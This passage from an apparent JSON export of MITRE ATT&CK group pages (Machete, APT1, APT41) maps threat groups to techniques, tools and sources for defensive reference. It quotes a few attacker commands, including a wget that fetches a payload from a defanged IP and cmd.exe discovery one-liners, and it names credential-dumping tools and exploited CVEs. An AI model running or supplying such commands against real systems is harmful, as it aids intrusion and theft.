MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.[4] Enterprise T1566 .001 Phishing: Spearphishing Attachment Machete has delivered spearphishing emails that contain a zipped file with malicious contents.[2][3][4] .002 Phishing: Spearphishing Link Machete has sent phishing emails that contain a link to an external server with ZIP and RAR archives.[1][3] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Machete has created scheduled tasks to maintain Machete's persistence.[4] Enterprise T1218 .007 System Binary Proxy Execution: Msiexec Machete has used msiexec to install the Machete malware.[4] Enterprise T1204 .001 User Execution: Malicious Link Machete has has relied on users opening malicious links delivered through spearphishing to execute malware.[1][2][3] .002 User Execution: Malicious File Machete has relied on users opening malicious attachments delivered through spearphishing to execute malware.[1][2][3][4] Software ID Name References Techniques S0409 Machete [2][3] Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Application Window Discovery, Archive Collected Data: Archive via Custom Method, Archive Collected Data, Audio Capture, Automated Exfiltration, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: Python, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Data from Removable Media, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, Exfiltration Over Physical Medium: Exfiltration over USB, Fallback Channels, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Command Obfuscation, Peripheral Device Discovery, Process Discovery, Scheduled Task/Job: Scheduled Task, Scheduled Transfer, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Unsecured Credentials: Private Keys, Video Capture References The Cylance Threat Research Team. (2017, March 22). El Machete's Malware Attacks Cut Through LATAM. Retrieved September 13, 2019. Kaspersky Global Research and Analysis Team. (2014, August 20). El Machete. Retrieved September 13, 2019. ESET. (2019, July). MACHETE JUST GOT SHARPER Venezuelan government institutions under attack. Retrieved September 13, 2019. kate. (2020, September 25). APT-C-43 steals Venezuelan military secrets to provide intelligence support for the reactionaries \u2014 HpReact campaign. Retrieved November 20, 2020. "
},
{
"id": 139,
"title": "APT1, Comment Crew, Comment Group, Comment Panda, Group G0006",
"path": "/groups/G0006/index.html",
"content": " APT1 APT1 is a Chinese threat group that has been attributed to the 2nd Bureau of the People\u2019s Liberation Army (PLA) General Staff Department\u2019s (GSD) 3rd Department, commonly known by its Military Unit Cover Designator (MUCD) as Unit 61398. [1] ID: G0006 \u24d8 Associated Groups: Comment Crew, Comment Group, Comment Panda Version: 1.4 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Comment Crew [1] Comment Group [1] Comment Panda [2] Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account APT1 used the commands net localgroup,net user, and net group to find accounts on the system.[1] Enterprise T1583 .001 Acquire Infrastructure: Domains APT1 has registered hundreds of domains for use in operations.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility APT1 has used RAR to compress files before moving them outside of the victim network.[1] Enterprise T1119 Automated Collection APT1 used a batch script to perform a series of discovery techniques and saves it to a text file.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution.[1] Enterprise T1584 .001 Compromise Infrastructure: Domains APT1 hijacked FQDNs associated with legitimate websites hosted by hop points.[1] Enterprise T1005 Data from Local System APT1 has collected files from a local victim.[1] Enterprise T1114 .001 Email Collection: Local Email Collection APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files.[1] .002 Email Collection: Remote Email Collection APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts APT1 has created email accounts for later use in social engineering, phishing, and when registering domains.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware.[1][3] Enterprise T1135 Network Share Discovery APT1 listed connected network shares.[1] Enterprise T1588 .001 Obtain Capabilities: Malware APT1 used publicly available malware for privilege escalation.[1] .002 Obtain Capabilities: Tool APT1 has used various open-source tools for privilege escalation purposes.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory APT1 has been known to use credential dumping using Mimikatz.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT1 has sent spearphishing emails containing malicious attachments.[1] .002 Phishing: Spearphishing Link APT1 has sent spearphishing emails containing hyperlinks to malicious files.[1] Enterprise T1057 Process Discovery APT1 gathered a list of running processes on the system using tasklist /v.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol The APT1 group is known to have used RDP during operations.[4] Enterprise T1016 System Network Configuration Discovery APT1 used the ipconfig /all command to gather network configuration information.[1] Enterprise T1049 System Network Connections Discovery APT1 used the net use command to get a listing on network connections.[1] Enterprise T1007 System Service Discovery APT1 used the commands net start and tasklist to get a listing of the services on the system.[1] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash The APT1 group is known to have used pass the hash.[1] Software ID Name References Techniques S0017 BISCUIT [1] Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Asymmetric Cryptography, Fallback Channels, Ingress Tool Transfer, Input Capture: Keylogging, Process Discovery, Screen Capture, System Information Discovery, System Owner/User Discovery, System Time Discovery S0119 Cachedump [1] OS Credential Dumping: Cached Domain Credentials S0025 CALENDAR [1] Command and Scripting Interpreter: Windows Command Shell, Web Service: Bidirectional Communication S0026 GLOOXMAIL [1] Application Layer Protocol: Publish/Subscribe Protocols, Web Service: Bidirectional Communication S0008 gsecdump [1] OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets S0100 ipconfig [1] System Network Configuration Discovery S0121 Lslsass [1] OS Credential Dumping: LSASS Memory S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0122 Pass-The-Hash Toolkit [1] Use Alternate Authentication Material: Pass the Hash S0012 PoisonIvy [1] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0006 pwdump [1] OS Credential Dumping: Security Account Manager S0345 Seasalt [3][5] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery S0057 Tasklist [1] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S0109 WEBC2 [1] Command and Scripting Interpreter: Windows Command Shell, Hijack Execution Flow: DLL, Ingress Tool Transfer S0123 xCmd [3] System Services: Service Execution References Mandiant. (n.d.). APT1 Exposing One of China\u2019s Cyber Espionage Units. Retrieved July 18, 2016. Crowdstrike Global Intelligence Team. (2014, June 9). CrowdStrike Intelligence Report: Putter Panda. Retrieved January 22, 2016. Mandiant. (n.d.). Appendix C (Digital) - The Malware Arsenal. Retrieved July 18, 2016. FireEye Labs. (2014, May 20). The PLA and the 8:00am-5:00pm Work Day: FireEye Confirms DOJ\u2019s Findings on APT1 Intrusion Activity. Retrieved November 17, 2024. Sherstobitoff, R., Malhotra, A. (2018, October 18). \u2018Operation Oceansalt\u2019 Attacks South Korea, U.S., and Canada With Source Code From Chinese Hacker Group. Retrieved November 30, 2018. "
},
{
"id": 140,
"title": "APT41, Wicked Panda, Brass Typhoon, BARIUM, Group G0096",
"path": "/groups/G0096/index.html",
"content": " APT41 APT41 is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, APT41 has been observed targeting various industries, including but not limited to healthcare, telecom, technology, finance, education, retail and video game industries in 14 countries.[1] Notable behaviors include using a wide range of malware and tools to complete mission objectives. APT41 overlaps at least partially with public reporting on groups including BARIUM and Winnti Group.[2][3] ID: G0096 \u24d8 Associated Groups: Wicked Panda, Brass Typhoon, BARIUM Contributors: Kyaw Pyiyt Htet, @KyawPyiytHtet; Nikita Rostovcev, Group-IB Version: 4.1 Created: 23 September 2019 Last Modified: 10 October 2024 Version Permalink Live Version Associated Group Descriptions Name Description Wicked Panda [4] Brass Typhoon [5] BARIUM [5] Campaigns ID Name First Seen Last Seen References Techniques C0040 APT41 DUST January 2023 [6] June 2024 [6] APT41 DUST was conducted by APT41 from 2023 to July 2024.[6] Acquire Infrastructure: Serverless, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Automated Collection, Compromise Accounts: Cloud Accounts, Create or Modify System Process: Windows Service, Data from Information Repositories, Data Staged: Local Data Staging, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Encrypted/Encoded File, Obtain Capabilities: Code Signing Certificates, Search Open Technical Databases: Scan Databases, Search Open Websites/Domains: Search Engines, Search Victim-Owned Websites, Server Software Component: Web Shell, Subvert Trust Controls: Code Signing, System Services: Service Execution, Web Service C0017 C0017 May 2021 [7] February 2022 [7] [7] Access Token Manipulation, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Custom Method, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exfiltration Over C2 Channel, Exfiltration Over Web Service, Exploit Public-Facing Application, Hijack Execution Flow, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Obtain Capabilities: Tool, OS Credential Dumping: Security Account Manager, Proxy, Scheduled Task/Job: Scheduled Task, Server Software Component: Web Shell, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Web Service: Dead Drop Resolver, Web Service Techniques Used Domain ID Name Use Enterprise T1134 Access Token Manipulation During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation.[7] Enterprise T1087 .001 Account Discovery: Local Account APT41 used built-in net commands to enumerate local administrator groups.[8] .002 Account Discovery: Domain Account APT41 used built-in net commands to enumerate domain administrator users.[8] Enterprise T1098 .007 Account Manipulation: Additional Local or Domain Groups APT41 has added user accounts to the User and Admin groups.[2] Enterprise T1583 .007 Acquire Infrastructure: Serverless APT41 DUST used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control.[6] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning APT41 used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications.[8] .003 Active Scanning: Wordlist Scanning APT41 leverages various tools and frameworks to brute-force directories on web servers.[8] Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT41 used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.[9] APT41 DUST used HTTPS for command and control.[6] During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads.[7] .002 Application Layer Protocol: File Transfer Protocols APT41 used exploit payloads that initiate download via ftp.[9] .004 Application Layer Protocol: DNS APT41 used DNS for C2 communications.[2][3] Enterprise T1560 .001 Archive Collected Data: Archive via Utility APT41 created a RAR archive of targeted files for exfiltration.[2] Additionally, APT41 used the makecab.exe utility to both download tools, such as NATBypass, to the victim network and to archive a file for exfiltration.[10] APT41 DUST used rar to compress data downloaded from internal Oracle databases prior to exfiltration.[6] .003 Archive Collected Data: Archive via Custom Method During C0017, APT41 hex-encoded PII data prior to exfiltration.[7] Enterprise T1119 Automated Collection APT41 DUST used tools such as SQLULDR2 and PINEGROVE to gather local system and database information.[6] Enterprise T1197 BITS Jobs APT41 used BITSAdmin to download and install payloads.[9][4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT41 created and modified startup files for persistence.[2][3] APT41 added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for Cobalt Strike.[9] Enterprise T1037 Boot or Logon Initialization Scripts APT41 used a hidden shell script in /etc/rc.d/init.d to leverage the ADORE.XSECbackdoor and Adore-NG rootkit.[1] Enterprise T1110 Brute Force APT41 performed password brute-force attacks on the local admin account.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT41 leveraged PowerShell to deploy malware families in victims\u2019 environments.[2][9] .003 Command and Scripting Interpreter: Windows Command Shell APT41 used cmd.exe /c to execute commands on remote machines.[2]APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.[9] During C0017, APT41 used cmd.exe to execute reconnaissance commands.[7] .004 Command and Scripting Interpreter: Unix Shell APT41 used Linux shell commands for system survey and information gathering prior to exploitation of vulnerabilities such as CVE-2019-19871.[9] .007 Command and Scripting Interpreter: JavaScript During C0017, APT41 deployed JScript web shells on compromised systems.[7] Enterprise T1586 .003 Compromise Accounts: Cloud Accounts APT41 DUST used compromised Google Workspace accounts for command and control.[6] Enterprise T1136 .001 Create Account: Local Account APT41 has created user accounts.[2] Enterprise T1543 .003 Create or Modify System Process: Windows Service APT41 modified legitimate Windows services to install malware backdoors.[2][3] APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike.[9] APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN.[6] Enterprise T1555 Credentials from Password Stores APT41 has obtained information about accounts, lists of employees, and plaintext and hashed passwords from databases.[8] .003 Credentials from Web Browsers APT41 used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores.[8] Enterprise T1486 Data Encrypted for Impact APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.[2] APT41 also used Microsoft Bitlocker to encrypt workstations and Jetico\u2019s BestCrypt to encrypt servers.[10] Enterprise T1213 .003 Data from Information Repositories: Code Repositories APT41 cloned victim user Git repositories during intrusions.[8] Enterprise T1005 Data from Local System APT41 has uploaded files and data from a compromised host.[3] During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.[7] Enterprise T1001 .003 Data Obfuscation: Protocol or Service Impersonation During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.[7] Enterprise T1074 .001 Data Staged: Local Data Staging APT41 DUST involved exporting data from Oracle databases to local CSV files prior to exfiltration.[6] During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory.[7] Enterprise T1030 Data Transfer Size Limits APT41 transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.[8] Enterprise T1140 Deobfuscate/Decode Files or Information During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads.[7] Enterprise T1484 .001 Domain or Tenant Policy Modification: Group Policy Modification APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware.[1] Enterprise T1568 .002 Dynamic Resolution: Domain Generation Algorithms APT41 has used DGAs to change their C2 servers monthly.[2] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography APT41 DUST used HTTPS for command and control.[6] Enterprise T1546 .008 Event Triggered Execution: Accessibility Features APT41 leveraged sticky keys to establish persistence.[2] Enterprise T1480 .001 Execution Guardrails: Environmental Keying APT41 has encrypted payloads using the Data Protection API (DPAPI), which relies on keys tied to specific user accounts on specific machines. APT41 has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.[11] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.[7] Enterprise T1041 Exfiltration Over C2 Channel During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration.[7] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage APT41 DUST exfiltrated collected information to OneDrive.[6] Enterprise T1190 Exploit Public-Facing Application APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.[9] APT41 leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.[8] APT41 exploited CVE-2021-26855 against a vulnerable Microsoft Exchange Server to gain initial access to the victim network.[10] During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.[7] Enterprise T1203 Exploitation for Client Execution APT41 leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396.[2] Enterprise T1133 External Remote Services APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.[2] Enterprise T1008 Fallback Channels APT41 used the Steam community page as a fallback mechanism for C2.[2] Enterprise T1083 File and Directory Discovery APT41 has executed file /bin/pwd on exploited victims, perhaps to return architecture related information.[9] Enterprise T1574 .001 Hijack Execution Flow: DLL APT41 has used search order hijacking to execute malicious payloads, such as Winnti for Windows.[4] APT41 has also used legitimate executables to perform DLL side-loading of their malware.[2] APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP.[6] APT41 DUST used also DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller.[6] .006 Hijack Execution Flow: Dynamic Linker Hijacking APT41 has configured payloads to load via LD_PRELOAD.[4] Enterprise T1562 .006 Impair Defenses: Indicator Blocking APT41 developed a custom injector that enables an Event Tracing for Windows (ETW) bypass, making malicious processes invisible to Windows logging.[8] Enterprise T1656 Impersonation APT41 impersonated an employee at a video game developer company to send phishing emails.[1] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs APT41 attempted to remove evidence of some of its activity by clearing Windows security and system events.[2] .003 Indicator Removal: Clear Command History APT41 attempted to remove evidence of some of its activity by deleting Bash histories.[2] .004 Indicator Removal: File Deletion APT41 deleted files from the system.[2][8] APT41 DUST deleted various artifacts from victim systems following use.[6] Enterprise T1105 Ingress Tool Transfer APT41 used certutil to download additional files.[9][4][3] APT41 downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access.[8] APT41 has uploaded Procdump and NATBypass to a staging directory and has used these tools in follow-on activities.[10] APT41 DUST involved execution of certutil.exe via web shell to download the DUSTPAN dropper.[6] During C0017, APT41 downloaded malicious payloads onto compromised systems.[7] Enterprise T1056 .001 Input Capture: Keylogging APT41 used a keylogger called GEARSHIFT on a target system.[2] Enterprise T1570 Lateral Tool Transfer APT41 uses remote shares to move and remotely execute payloads during lateral movemement.[8] Enterprise T1036 .004 Masquerading: Masquerade Task or Service APT41 has created services to appear as benign system tools.[3] APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as w3wp.exe or conn.exe.[6] During C0017, APT41 used SCHTASKS /Change to modify legitimate scheduled tasks to run malicious code.[7] .005 Masquerading: Match Legitimate Resource Name or Location APT41 attempted to masquerade their files as popular anti-virus software.[2][3] During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp to .upx likely to avoid hunting detections.[7] Enterprise T1112 Modify Registry APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.[2][3] Enterprise T1104 Multi-Stage Channels APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.[9] Enterprise T1599 Network Boundary Bridging APT41 used NATBypass to bypass firewall restrictions and to access compromised systems via RDP.[10] Enterprise T1046 Network Service Discovery APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets.[2] Enterprise T1135 Network Share Discovery APT41 used the net share command as part of network reconnaissance.[2][3] Enterprise T1027 Obfuscated Files or Information APT41 used VMProtected binaries in multiple intrusions.[9] During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection.[7] .002 Software Packing APT41 uses packers such as Themida to obfuscate malicious files.[8] During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries.[7] .013 Encrypted/Encoded File APT41 DUST used encrypted payloads decrypted and executed in memory.[6] Enterprise T1588 .002 Obtain Capabilities: Tool APT41 has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor.[2] For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.[7] .003 Obtain Capabilities: Code Signing Certificates APT41 DUST used stolen code signing certificates to sign DUSTTRAP malware and components.[6] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory APT41 has used hashdump, Mimikatz, Procdump, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts.[2][3][10] .002 OS Credential Dumping: Security Account Manager APT41 extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the reg save command or by exploiting volume shadow copies.[8] During C0017, APT41 copied the SAM and SYSTEM Registry hives for credential harvesting.[7] .003 OS Credential Dumping: NTDS APT41 used ntdsutil to obtain a copy of the victim environment ntds.dit file.[8] Enterprise T1069 Permission Groups Discovery APT41 used net group commands to enumerate various Windows user groups and permissions.[8] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.[2] Enterprise T1542 .003 Pre-OS Boot: Bootkit APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.[2] Enterprise T1055 Process Injection APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.[2] Enterprise T1090 Proxy APT41 used a tool called CLASSFON to covertly proxy network communications.[2] During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic.[7] Enterprise T1012 Query Registry APT41 queried registry values to determine items such as configured RDP ports and network configurations.[8] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol APT41 used RDP for lateral movement.[2][4] APT41 used NATBypass to expose local RDP ports on compromised systems to the Internet.[10] .002 Remote Services: SMB/Windows Admin Shares APT41 has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol, then executes files through Windows Management Instrumentation (WMI).[4][10] Enterprise T1018 Remote System Discovery APT41 has used MiPing to discover active systems in the victim network.[10] Enterprise T1496 .001 Resource Hijacking: Compute Hijacking APT41 deployed a Monero cryptocurrency mining tool in a victim\u2019s environment.[2][1] Enterprise T1014 Rootkit APT41 deployed rootkits on Linux systems.[2][4] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT41 used a compromised account to create a scheduled task on a system.[2][4] During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared.[7] Enterprise T1596 .005 Search Open Technical Databases: Scan Databases APT41 uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.[8] APT41 DUST used internet scan data for target development.[6] Enterprise T1593 .002 Search Open Websites/Domains: Search Engines APT41 DUST involved use of search engines to research victim servers.[6] Enterprise T1594 Search Victim-Owned Websites APT41 DUST involved access of external victim websites for target development.[6] Enterprise T1505 .003 Server Software Component: Web Shell APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.[6] During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects.[7] Enterprise T1553 .002 Subvert Trust Controls: Code Signing APT41 leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.[2][3] APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads.[6] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain APT41 gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.[2] Enterprise T1218 .001 System Binary Proxy Execution: Compiled HTML File APT41 used compiled HTML (.chm) files for targeting.[2] .011 System Binary Proxy Execution: Rundll32 APT41 has used rundll32.exe to execute a loader.[4] Enterprise T1082 System Information Discovery APT41 uses multiple built-in commands such as systeminfo and net config Workstation to enumerate victim system basic configuration information.[8] During C0017, APT41 issued ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems.[7] Enterprise T1016 System Network Configuration Discovery APT41 collected MAC addresses from victim machines.[2][3] During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery.[7] Enterprise T1049 System Network Connections Discovery APT41 has enumerated IP addresses of network resources and used the netstat command as part of network reconnaissance. The group has also used a malware variant, HIGHNOON, to enumerate active RDP sessions.[2][3] Enterprise T1033 System Owner/User Discovery APT41 has executed whoami commands, including using the WMIEXEC utility to execute this on remote machines.[2][8] During C0017, APT41 used whoami to gather information from victim machines.[7] Enterprise T1569 .002 System Services: Service Execution APT41 used svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.[9][3] APT41 DUST used Windows services to execute DUSTPAN.[6] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash APT41 uses tools such as Mimikatz to enable lateral movement via captured password hashes.[8] Enterprise T1078 Valid Accounts APT41 used compromised credentials to log on to other systems.[2][4] Enterprise T1102 .001 Web Service: Dead Drop Resolver APT41 used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.[2] During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign.[7] Enterprise T1047 Windows Management Instrumentation APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit.[2][3] APT41 has executed files through Windows Management Instrumentation (WMI).[10] Software ID Name References Techniques S0073 ASPXSpy [2] Server Software Component: Web Shell S0190 BITSAdmin [9] BITS Jobs, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0069 BLACKCOFFEE [2] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Multi-Stage Channels, Process Discovery, Web Service: Dead Drop Resolver, Web Service: Bidirectional Communication S0160 certutil [9] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0020 China Chopper APT41 used the China Chopper web shell as a persistence mechanism on compromised Microsoft Exchange servers.[10][2] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S0154 Cobalt Strike [9][3] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, 